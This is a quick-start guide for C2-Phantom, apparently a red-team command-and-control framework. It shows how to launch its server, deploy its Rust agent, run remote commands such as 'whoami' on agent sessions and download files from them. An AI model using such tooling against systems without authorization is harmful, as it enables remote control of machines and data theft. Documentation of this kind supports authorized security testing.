# 🚀 C2-Phantom Quick Start Guide

## ⚡ Zero-Setup Launch (Windows)

### Step 1: Start the Server

```powershell
# Option A: Using PowerShell script (Recommended)
.\START-SERVER.ps1

# Option B: Manual
cd server
go run main.go
```

The server will start on:
- HTTP: `http://localhost:8080`
- Default API Key: `c2phantom-admin-key-change-me`

### Step 2: Use the CLI

```powershell
# Initialize (first time only)
python phantom.py init

# List agents
python phantom.py list

# Execute command
python phantom.py execute "whoami" --session <SESSION_ID> --server http://localhost:8080

# Start interactive shell
python phantom.py cli
```

### Step 3: Deploy Agent

```powershell
# Build Rust agent
cd agent
cargo build --release

# Run agent (connects to server automatically)
.\target\release\agent.exe --server http://localhost:8080
```

---

## 🐳 Docker Deployment (Production)

```powershell
# Start all services (PostgreSQL + Redis + Server)
docker-compose up -d

# Check status
docker-compose ps

# View logs
docker-compose logs -f server

# Stop services
docker-compose down
```

Access server at `http://localhost:8080`

---

## 🔧 No Docker? Manual Setup

### 1. Install PostgreSQL

```powershell
# Download: https://www.postgresql.org/download/windows/
# Or use Chocolatey:
choco install postgresql

# Create database
createdb c2phantom
psql c2phantom < init.sql
```

### 2. Install Redis

```powershell
# Download: https://github.com/microsoftarchive/redis/releases
# Or use Chocolatey:
choco install redis-64

# Start Redis
redis-server
```

### 3. Configure Environment

```powershell
$env:DATABASE_URL = "postgres://postgres:postgres@localhost:5432/c2phantom"
$env:REDIS_URL = "localhost:6379"
$env:HTTP_PORT = "8080"
$env:LOG_LEVEL = "info"
```

### 4. Start Server

```powershell
.\START-SERVER.ps1
```

---

## 📡 Quick API Test

```powershell
# Health check
Invoke-WebRequest http://localhost:8080/health

# List agents (requires API key)
Invoke-RestMethod -Uri "http://localhost:8080/api/v1/agents" `
    -Headers @{"X-API-Key" = "c2phantom-admin-key-change-me"}

# Get stats
Invoke-RestMethod -Uri "http://localhost:8080/api/v1/stats" `
    -Headers @{"X-API-Key" = "c2phantom-admin-key-change-me"}
```

---

## 🛡️ Security Checklist

### ✅ Before Production

- [ ] Change default API key in database
- [ ] Enable TLS/HTTPS with valid certificates
- [ ] Configure firewall rules
- [ ] Use strong PostgreSQL password
- [ ] Enable Redis password authentication
- [ ] Review `server/main.go` rate limiting settings
- [ ] Update `docker-compose.yml` environment variables

### Generate TLS Certificates

```powershell
# Self-signed (development)
openssl req -x509 -newkey rsa:4096 -keyout server.key `
    -out server.crt -days 365 -nodes `
    -subj "/CN=c2phantom.local"

# Start server with TLS
$env:TLS_CERT = "server.crt"
$env:TLS_KEY = "server.key"
.\START-SERVER.ps1
```

---

## 🎯 Common Commands

```powershell
# CLI - Initialize
python phantom.py init

# CLI - List active sessions
python phantom.py list --status active

# CLI - Execute command
python phantom.py execute "ipconfig" --session <ID> --server http://localhost:8080

# CLI - Download file
python phantom.py download "C:\temp\data.txt" "./data.txt" --session <ID>

# CLI - Start interactive shell
python phantom.py cli

# Server - View logs (Docker)
docker-compose logs -f server

# Server - Restart (Docker)
docker-compose restart server

# Agent - Build release
cd agent && cargo build --release

# Agent - Run with custom server
.\target\release\agent.exe --server http://192.168.1.100:8080
```

---

## 🔍 Troubleshooting

### "command not found: c2-phantom"
**Fix**: Use `python phantom.py` instead or add Python Scripts to PATH

### "Database connection failed"
**Fix**: Ensure PostgreSQL is running and database exists:
```powershell
createdb c2phantom
psql c2phantom < init.sql
```

### "Redis connection failed"
**Fix**: Start Redis server:
```powershell
redis-server
```

### "Port already in use"
**Fix**: Change port or kill existing process:
```powershell
# Find process
netstat -ano | findstr :8080

# Kill process
taskkill /PID <PID> /F
```

### "TLS certificate error"
**Fix**: Either disable TLS (development) or generate valid certificates

---

## 📚 Full Documentation

- **Installation**: See [INSTALL.md](INSTALL.md)
- **API Reference**: See [API.md](API.md)
- **Feature List**: See [FEATURES.md](FEATURES.md)
- **Examples**: See `examples/` directory

---

## ⚠️ Legal Notice

C2-Phantom is for **authorized security testing and education only**.
Unauthorized use on systems you don't own is **illegal**.

---

**Need Help?** Check the [GitHub Issues](https://github.com/4fqr/c2-phantom/issues)
